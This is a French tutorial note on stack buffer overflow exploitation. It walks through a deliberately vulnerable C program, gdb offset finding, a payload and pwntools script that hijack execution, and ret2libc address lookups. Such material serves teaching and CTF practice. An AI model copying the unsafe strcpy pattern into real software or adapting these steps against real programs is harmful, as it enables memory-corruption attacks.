# [Pwn](https://en.wikipedia.org/wiki/Pwn)

_"Segmentation fault"_ est une erreur que tous ceux qui ont déjà programmé en C ont certainement rencontrés. Le **segfault** signifie que <u>le programme a tenté d'accéder à une zone mémoire auquel il n'est pas censé avoir accès</u>.

Quand un buffer est placé sur la pile, il grandit dans le sens inverse de la stack, c'est-à-dire qu'il grandit des adresses basses vers les adresses hautes. De ce fait, **il y a danger !** 

En effet, le buffer peut potentiellement réécrire le contenu des registres qui ont été push sur la stack _({r,e}bp, {r,e}ip)_ et par conséquent contrôler le flux d'exécution de notre programme _(en gros il peut appeler les fonctions qu'il veut)_.

> **Objectif:** comprendre les failles de type buffer overflow, étudier les protections mises en place au cours des dernières années ainsi que leurs contournements.

## Avant-propos

Lire et comprendre [Reverse](https://github.com/amir0r/notes/tree/master/Infosec/Reverse#reverse) avant.

## Stack Buffer overflow

On considère le programme suivant:

```c
#include <stdio.h>
#include <string.h>

void  ret2flag()
{
  printf("Well done! You exploited a buffer overflow ;)\n");
}

void func(char *arg)
{
    char buffer[18];
    strcpy(buffer,arg);
    printf("%s\n", buffer);
}

int main(int argc, char *argv[])
{
    if(argc != 2) printf("Usage: ./bof <string> \n");
    else func(argv[1]);
    return 0;
}
```

Ce programme affiche simplement la chaîne de caractères qui lui est donnée en paramètre.

Le problème de ce programme c'est le `strcpy` qui <u>copie dans le **buffer** de taille 32 un chaîne de caractères de taille variable _(inconnu)_</u>. 

### Exemple pratique nº1

**Objectif nº1:** appeler la fonction `ret2flag` en écrasant la sauvegarde d'**`EIP`** _(stockée sur la pile lors de l'appel à la fonction)_ via un débordement de tampon _(buffer overflow)_.

> **Note**: _pour compiler 32 bits sur du 64 bits _`sudo dpkg --add-architecture i386 && sudo apt update sudo apt-get install gcc-multilib`

```bash
$ # on désactive l'ASLR (décrit un peu plus bas)
$ echo 0 > /proc/sys/kernel/randomize_va_space
$ # compile bof.c pour archi 32 bits en désactivant le Canari, le NX-Bit, ainsi que le PIE (décrits également plus bas)
$ gcc -m32 -fno-stack-protector -z execstack -no-pie bof.c -o bof
$ # on peut vérifier les sécurités activées sur un programme via la commande `checksec` dans gdb
$ gdb -q bof
Reading symbols from bof...(no debugging symbols found)...done.
pwndbg$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : Partial
pwndbg$ # on calcule le padding nécessaire pour faire crasher le programme
pwndbg$ pattern create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
pwndbg$ # on lance le programme avec le pattern généré
Program received signal SIGSEGV, Segmentation fault.

LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────
 EAX  0x65
 EBX  0x41284141 ('AA(A')
 ECX  0xb7fb4890 (_IO_stdfile_1_lock) ◂— 0
 EDX  0x65
 EDI  0xb7fb3000 (_GLOBAL_OFFSET_TABLE_) ◂— insb   byte ptr es:[edi], dx /* 0x1d9d6c */
 ESI  0xb7fb3000 (_GLOBAL_OFFSET_TABLE_) ◂— insb   byte ptr es:[edi], dx /* 0x1d9d6c */
 EBP  0x41414441 ('ADAA')
 ESP  0xbffff320 ◂— 'AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
 EIP  0x2941413b (';AA)')
────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────
Invalid address 0x2941413b
────────────────────────────────────────────[ STACK ]────────────────────────────────────────────
00:0000│ esp  0xbffff320 ◂— 'AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
01:0004│      0xbffff324 ◂— 'AaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
02:0008│      0xbffff328 ◂— '0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
03:000c│      0xbffff32c ◂— 'AAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
04:0010│      0xbffff330 ◂— 'A1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
05:0014│      0xbffff334 ◂— 'GAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
06:0018│      0xbffff338 ◂— 'AA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
07:001c│      0xbffff33c ◂— 'AHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
──────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────
 ► f 0 2941413b
   f 1 41454141
   f 2 41416141
   f 3 46414130
   f 4 41624141
   f 5 41413141
   f 6 63414147
   f 7 41324141
   f 8 41414841
   f 9 33414164
   f 10 41494141
─────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg$ # on calcul l'offset (d'autres méthodes existent comme ave pattern offset)
pwndbg$ pattern search
Registers contain pattern buffer:
EBX+0 found at offset: 22
EBP+0 found at offset: 26
EIP+0 found at offset: 30
Registers point to pattern buffer:
[ESP] --> offset 34 - size ~66
Pattern buffer found at:
0x00405160 : offset    0 - size  100 ([heap])
0xbffff2fe : offset    0 - size  100 ($sp + -0x22 [-9 dwords])
0xbffff57f : offset    0 - size  100 ($sp + 0x25f [151 dwords])
References to pattern buffer found at:
0xb7fb3d84 : 0x00405160 (/usr/lib/i386-linux-gnu/libc-2.28.so)
0xb7fb3d88 : 0x00405160 (/usr/lib/i386-linux-gnu/libc-2.28.so)
0xb7fb3d8c : 0x00405160 (/usr/lib/i386-linux-gnu/libc-2.28.so)
0xb7fb3d90 : 0x00405160 (/usr/lib/i386-linux-gnu/libc-2.28.so)
0xb7fb3d94 : 0x00405160 (/usr/lib/i386-linux-gnu/libc-2.28.so)
0xb7fb3d98 : 0x00405160 (/usr/lib/i386-linux-gnu/libc-2.28.so)
0xb7fb3d9c : 0x00405160 (/usr/lib/i386-linux-gnu/libc-2.28.so)
0xbffff164 : 0x00405160 ($sp + -0x1bc [-111 dwords])
0xbffff1c8 : 0x00405160 ($sp + -0x158 [-86 dwords])
0xbffff1e8 : 0x00405160 ($sp + -0x138 [-78 dwords])
0xbffff1f4 : 0x00405160 ($sp + -0x12c [-75 dwords])
0xbffff214 : 0x00405160 ($sp + -0x10c [-67 dwords])
0xbffff224 : 0x00405160 ($sp + -0xfc [-63 dwords])
0xbffff274 : 0x00405160 ($sp + -0xac [-43 dwords])
0xbffff264 : 0xbffff2fe ($sp + -0xbc [-47 dwords])
0xbffff2e0 : 0xbffff2fe ($sp + -0x40 [-16 dwords])
0xbffff2e4 : 0xbffff57f ($sp + -0x3c [-15 dwords])
0xbffff3e8 : 0xbffff57f ($sp + 0xc8 [50 dwords])
pwndbg$ # l'offset qui nous intéresse est donc 30
```

Maintenant, il faut récupérer l'adresse de la fonction `ret2flag` que l'on souhaite appeler. Pour ce faire, on peut utiliser `nm` qui permet de lister le noms des **symboles** présents dans notre fichier binaire:

```bash
$ nm bof | grep ret2flag
000011a9 T ret2flag
```

On peut également le faire avec `gdb` avec la commande `info fu`:

```
pwndbg$ info fu
All defined functions:

Non-debugging symbols:
0x00001000  _init
0x00001030  strcpy@plt
0x00001040  puts@plt
0x00001050  __libc_start_main@plt
0x00001060  __cxa_finalize@plt
0x00001070  _start
0x000010b0  __x86.get_pc_thunk.bx
0x000010c0  deregister_tm_clones
0x00001100  register_tm_clones
0x00001150  __do_global_dtors_aux
0x000011a0  frame_dummy
0x000011a5  __x86.get_pc_thunk.dx
0x000011a9  ret2flag
0x000011d4  func
0x0000120d  main
0x00001266  __x86.get_pc_thunk.ax
0x00001270  __libc_csu_init
0x000012d0  __libc_csu_fini
0x000012d4  _fini
```

On doit donc envoyer au programme l'adresse `0x000011a9` en **_little endian_**. [pwntools](https://docs.pwntools.com/) permet de faire la conversion:

```bash
$ python
Python 2.7.18rc1 (default, Apr  7 2020, 12:05:55) 
[GCC 9.3.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import p32
>>> 
>>> p32(0x000011a9)
'\xa9\x11\x40\x00'
>>> quit
$ # on passe maintenant à l'exploitation
$ ./bof $(python -c "print 'A' * 30 + '\xa9\x11\x40\x00'")
bash: warning: command substitution: ignored null byte in input
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�@
Well done! You exploited a buffer overflow ;)
Segmentation fault
```

Et voilà le travail !

Il est possible de complétement automatiser ce processus via le script suivant:

```python
import pwn

offset = 30
payload = 'A' * offset + pwn.p32(0x080491b6)
e = pwn.process(['./bof', payload])
print(e.recvall())
```

> _**Note**: J'ai changé de machine entre temps donc l'adresse a changé._

```bash
$ python boum.py 
[+] Starting local process './bof': pid 2554
[+] Receiving all data: Done (81B)
[*] Process './bof' stopped with exit code -11 (SIGSEGV) (pid 2554)
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xb6\x91\x04
Well done! You exploited a buffer overflow ;)
```

> **TODO:** voir comment automatiser le calcul de l'offset.

### Exemple pratique nº2

### Shellcode

### Stack Canari? Bypass!

> Technique du Canary est une valeur placée après les fonctions/buffers à risque (que l'on souhaite protéger). Si le canary à été altéré, le programme s'arrête.

- [**Hackndo** - Technique du Canari : Bypass](https://beta.hackndo.com/technique-du-canari-bypass/)

### NX-Bit? ret2libc!

> Stack non exécutable.

```bash
$ # on cherche les adresses de @system et @/bin/sh
$ ldd <bin>
		    linux-vdso.so.1 (0x00007fff2dda7000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fc2d8bab000)
        /lib64/ld-linux-x86-64.so.2 (0x00007fc2d8dbd000)
$ readelf -a /lib/x86_64-linux-gnu/libc.so.6 | grep system
   235: 0000000000156ce0   103 FUNC    GLOBAL DEFAULT   16 svcerr_systemerr@@GLIBC_2.2.5
   615: 00000000000554e0    45 FUNC    GLOBAL DEFAULT   16 __libc_system@@GLIBC_PRIVATE
  1425: 00000000000554e0    45 FUNC    WEAK   DEFAULT   16 system@@GLIBC_2.2.5
$ grep -boa "/bin/sh" /lib/x86_64-linux-gnu/libc.so.6
1795603:/bin/sh
$ python -c "print hex(1795603 + 0x00007fc2d8bab000)"
0x7fc2d8d61613
$ python -c "print hex(0x00000000000554e0 + 0x00007fc2d8bab000)"
0x7fc2d8c004e0
```

- [**Hackndo** - ret2libc](https://beta.hackndo.com/retour-a-la-libc/)

### ASLR? ROP!

> Address Space Layout Randomization

> Return Oriented programming

```bash
$ ldd <bin>
		    not a dynamic executable
$ # ASLR active ? (0 - unactive), (1 - partial), (2 - fully active)
$ cat /proc/sys/kernel/randomize_va_space 
2
```

### PIC

> Position Independant Code

### PIE

___

## Heap overflow

> **TODO**

## Format string exploit

> **TODO**
___

## Tools

- [python pwntools](https://docs.pwntools.com/en/stable/)
- [**ROPgadget**](https://github.com/JonathanSalwan/ROPgadget)
- [**Ropper**](https://github.com/sashs/Ropper)
- [xrop](https://github.com/acama/xrop)

## Exercises

- [ROP Emporium](https://ropemporium.com/)
- [Protostar](https://exploit-exercises.lains.space/protostar/)
- [microcorruption.com](https://microcorruption.com/)
- [**pwnadventure** - VIDEO Game](http://www.pwnadventure.com/) + [_setup server_](https://github.com/LiveOverflow/PwnAdventure3)

## Ressources

### Vidéos

- [**Louka Jacques-Chevallier** - 1, 2, 3 PWNED!](https://youtu.be/hmt8M9YLwTg?list=PL8xs7xVCig3z-HXt99t3ZDlaDF_kRbK19)
- [**Hackndo** - exploitation de binaires](https://www.youtube.com/watch?v=V7Gdc32XRhA&list=PL8mmTTrIt_anpC5jd8bCwTB5nLX7GFloq)
- [**François Boisson** - explication de "une faille de type bufferoverflow ..."_](https://youtu.be/u-OZQkv2ebw)
- [**LiveOverflow** - Binary Exploitation / Memory Corruption](https://www.youtube.com/playlist?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN)
- [**0x41414141** youtube channel](https://www.youtube.com/channel/UCPqes566OZ3G_fjxL6BngRQ/playlists)
- [**nasm - RE** - pWn](https://www.youtube.com/playlist?list=PLcT0DaY68xGzD87AmjN4e9IuF4DfXUfsD)
- [**John Hammond** - Binary exploitation (CTF WU)](https://www.youtube.com/watch?v=yH8kzOkA_vw&list=PL1H1sBF1VAKVg451vJ-rx0y_ZuQMHPamH)

### Articles/Cours

- [**Hackndo** - Buffer overflow](https://beta.hackndo.com/buffer-overflow/)
- [**0x0ff.info** - Buffer Overflow & gdb – Part 1](https://www.0x0ff.info/2015/buffer-overflow-gdb-part1/)
- [**NagarroSecurity** - An interactive guide to buffer overflow](https://nagarrosecurity.com/blog/interactive-buffer-overflow-exploitation)
- [**Hackndo** - Technique du Canari : Bypass](https://beta.hackndo.com/technique-du-canari-bypass/)
- [**Hackndo** - ret2libc](https://beta.hackndo.com/retour-a-la-libc/)
- [**Hackndo** - ROP (Return Oriented Programming)](https://beta.hackndo.com/return-oriented-programming/)
- [**Geluchat** - Petit Manuel du ROP à l'usage des débutants](https://www.dailysecurity.fr/return_oriented_programming/)
- [LSE - Security Workshop](https://www.lse.epita.fr/teaching/epita/hts/workshop-secu.pdf)
- [ctf101 - buffer-overflow](https://ctf101.org/binary-exploitation/buffer-overflow/)
